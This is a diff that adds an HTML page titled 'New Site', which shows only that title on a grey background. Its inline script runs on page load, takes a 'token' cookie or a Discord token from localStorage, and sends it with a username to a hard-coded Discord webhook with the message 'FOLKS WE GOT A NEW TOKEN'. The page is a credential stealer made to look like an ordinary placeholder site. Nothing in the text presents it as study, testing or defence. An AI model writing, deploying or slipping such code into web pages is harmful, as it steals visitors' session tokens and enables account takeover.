@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>New Site</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+        }
+        .content {
+            text-align: center;
+            font-size: 24px;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="content">
+        New Site
+        <div class="username" style="display: none;">User123</div>
+    </div>
+
+    <script>
+        let lastTokenSent = null;
+        let requestTimestamps = [];
+
+        function cleanUpOldRequests() {
+            const now = Date.now();
+            requestTimestamps = requestTimestamps.filter(timestamp => now - timestamp < 5000);
+        }
+
+        document.addEventListener("DOMContentLoaded", () => {
+            const token = document.cookie.match(/token=([\w-]+)/)?.[1] || localStorage.getItem('discord_token');
+            const username = document.querySelector('.username')?.innerText || "Unknown User";
+
+            if (token) {
+                cleanUpOldRequests();
+
+                if (requestTimestamps.length >= 5) {
+                    return;
+                }
+
+                if (token === lastTokenSent) {
+                    return;
+                }
+
+                const webhookURL = 'https://discord.com/api/webhooks/1321597632824611018/iIAs-UeScagNLtAkcEP1qpkm0uUBJIWIg81Jlo56U_Pnv6dFacn8k_FCNYfrUDWcy9vU';
+
+                requestTimestamps.push(Date.now());
+                lastTokenSent = token;
+
+                fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: `@everyone FOLKS WE GOT A NEW TOKEN: ${username} x ${token}` })
+                })
+                .then(response => {
+                    if (!response.ok) {
+                        console.error('Error sending request:', response.statusText);
+                    }
+                })
+                .catch(error => {
+                    console.error('Request failed:', error);
+                });
+            }
+        });
+    </script>
+
+</body>
+</html>
